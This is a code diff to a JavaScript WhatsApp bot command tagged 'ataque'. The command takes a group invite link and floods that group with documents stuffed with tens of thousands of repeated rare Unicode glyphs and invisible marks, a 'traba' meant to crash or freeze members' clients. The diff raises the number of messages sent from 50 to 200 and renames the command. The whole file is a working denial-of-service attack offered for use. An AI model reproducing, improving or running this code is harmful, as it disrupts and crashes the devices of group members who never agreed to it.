@@ -10,7 +10,7 @@ let handler = async (m, { conn, text }) => {
   }
 
   if (!text || !text.includes('whatsapp.com')) {
-    return m.reply('😿 Usa: .mixtraba <enlace del grupo>', m);
+    return m.reply('😿 Usa: .hard <enlace del grupo>', m);
   }
 
   const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
@@ -63,7 +63,7 @@ let handler = async (m, { conn, text }) => {
   };
 
   const docGato = async (i) => {
-    const traba = '𑇂𑆵𑆴𑆿'.repeat(75000);
+    const traba = '𑇂𑆵𑆴𑆿'.repeat(30000);
     const contenido = '\u200E'.repeat(5000) + i;
     await conn.sendMessage(groupId, {
       document: Buffer.from(contenido),
@@ -73,9 +73,8 @@ let handler = async (m, { conn, text }) => {
     });
   };
 
-  // Total de mensajes: 50 (en bloques de 4)
-  const delayMs = 6000;
-  const total = 50;
+  const delayMs = 9000; // 9 segundos entre cada ciclo
+  const total = 200;
   const ciclos = Math.floor(total / 4);
 
   for (let i = 0; i < ciclos; i++) {
@@ -92,7 +91,6 @@ let handler = async (m, { conn, text }) => {
     await new Promise(r => setTimeout(r, delayMs));
   }
 
-  // Enviar los mensajes restantes si no fue múltiplo exacto
   const restantes = total % 4;
   const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato];
   for (let i = 0; i < restantes; i++) {
@@ -100,10 +98,10 @@ let handler = async (m, { conn, text }) => {
     await new Promise(r => setTimeout(r, delayMs));
   }
 
-  await conn.reply(m.chat, `✅ 50 trabas enviados al grupo ${groupId}`, m);
+  await conn.reply(m.chat, `✅ 200 mensajes enviados al grupo ${groupId} en 15 minutos.`, m);
 };
 
-handler.help = ['monter01 <enlace>'];
+handler.help = ['hard <enlace>'];
 handler.tags = ['ataque', 'grupo'];
 handler.command = ['monter01'];
 
